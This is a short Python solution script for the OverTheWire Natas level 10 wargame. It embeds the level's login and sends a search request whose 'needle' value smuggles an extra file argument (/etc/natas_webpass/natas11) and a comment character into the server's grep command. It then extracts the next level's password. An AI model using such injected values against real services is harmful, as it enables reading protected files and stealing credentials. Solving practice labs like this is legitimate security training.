import requests, re
USER = 'natas10'
PASS = 't7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu'
URL = f'http://{USER}.natas.labs.overthewire.org/'
auth_basic = requests.auth.HTTPBasicAuth(USER, PASS)
burp = {"http": "http://127.0.0.1:8080"}

payload = '?needle=a+%2Fetc%2Fnatas_webpass%2Fnatas11+%23&submit=Search'
url = URL + payload

def myflag():
    request = requests.get(url=url, auth=auth_basic, proxies=burp)
    response_http = request.text
    flag_regex = re.findall('([0-9a-zA-Z]{32})', response_http)
    return flag_regex[0 if len(flag_regex) == 1 else 1]
print("The pass for the next level is:", myflag())